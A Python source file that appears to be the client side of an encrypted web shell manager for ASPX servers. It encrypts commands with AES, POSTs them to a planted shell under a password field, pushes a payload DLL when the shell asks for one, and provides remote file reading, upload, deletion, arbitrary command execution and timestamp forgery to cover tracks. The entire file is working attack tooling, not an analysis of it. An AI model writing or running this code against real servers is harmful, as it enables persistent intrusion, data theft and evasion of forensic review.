import base64
import hashlib
import requests
from CommonConf import CommonConf
from Conf import Conf
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class ASPXCommon:
    def __init__(self,header=''):
        self.headers = Conf.HEADERS
        # print(header)
        if header != '':
            key, value = header.split(":", 1)
            self.headers[key] = value.lstrip()
        self.timeout = Conf.TIMEOUT
        self.payload_path = Conf.ASPX_PAYLOAD_FILEPATH

    def csharp_compatible_encrypt(self,plaintext:bytes, key) -> str:
        key_bytes = hashlib.md5(key.encode()).hexdigest()[:16].encode() # 模拟 Encoding.Default
        iv_bytes = key_bytes             # IV = Key（C# 写法）
        
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded = pad(plaintext, AES.block_size)
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode()

    def csharp_compatible_decrypt(self,base64_ciphertext, key) -> bytes:
        key_bytes = hashlib.md5(key.encode()).hexdigest()[:16].encode()
        iv_bytes = key_bytes
        
        data = base64.b64decode(base64_ciphertext)
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        decrypted_padded = cipher.decrypt(data)
        decrypted = unpad(decrypted_padded, AES.block_size)
        return decrypted

    def read_init_payload(self,filename):
        with open(filename,"r") as fr:
            payload = fr.read()
        return payload
    
    def set_payload(self,payload,key) -> str:
        # payload = ''
        payload = self.csharp_compatible_encrypt(payload,key)
        return payload
    
    def send_payload_and_get_result(self,url,password,payload,key):
        data = {password:payload}
        r=requests.post(url=url,headers=self.headers,data=data,verify=False,timeout=self.timeout)
        # print(r.text)
        result = self.csharp_compatible_decrypt(r.text,key).decode()
        if result == 'dll not init':
            print("Payload dll has not been init, waitting...")
            with open(self.payload_path+'Payload.dll','rb') as f:
                cipherbyte = f.read()
            initDllData = {
                'initdll': self.csharp_compatible_encrypt(cipherbyte,key)
            }
            # send class bytes to init
            requests.post(url=url,headers=self.headers,data=initDllData,verify=False,timeout=self.timeout)

            # continue execute action after class init
            r=requests.post(url=url,headers=self.headers,data=data,verify=False,timeout=self.timeout)
            # print(r3.text)
            result = self.csharp_compatible_decrypt(r.text,key).decode()
        
        return result


    def getbasicinfo(self,url,password,key):
        doaction = 'getBasicsInfo'
        # set anything to avoid encript fail
        args = '1'
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def get_files_attr(self,url,password,key,dirName):
        doaction = 'getFile'
        args = dirName
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        data = CommonConf().format_result_aspx_getFileAtt(data)
        return data

    def cat_file(self,url,password,key,filePath):
        doaction = 'readFile'
        args = filePath
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def copy_file(self,url,password,key,srcFileName,destFileName):
        doaction = 'copyFile'
        # split with ','
        args = srcFileName+','+destFileName
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def move_file(self,url,password,key,srcFileName,destFileName):
        doaction = 'moveFile'
        # split with ','
        args = srcFileName+','+destFileName
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def delete_file(self,url,password,key,filePath):
        doaction = 'deleteFile'
        args = filePath
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def upload_file(self,url,password,key,localFile,remoteFile):
        doaction = 'uploadFile'
        # split with ','
        content = ''
        with open(localFile,'rb') as f:
            content = f.read()
        args = remoteFile+','+base64.b64encode(content).decode()
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def execCommand(self,url,password,key,cmdLine):
        doaction = 'execCommand'
        command = cmdLine[0]
        commandargs = ''
        if len(cmdLine) > 1:
            commandargs = ' '.join(cmdLine[1:])

        # split with ','
        args = command + ',' +commandargs

        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data
    
    def set_file_time(self,url,password,key,filename,newtime):
        doaction = 'modifyFileTimeAttr'
        # split with ','
        args = filename + ',' + newtime
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data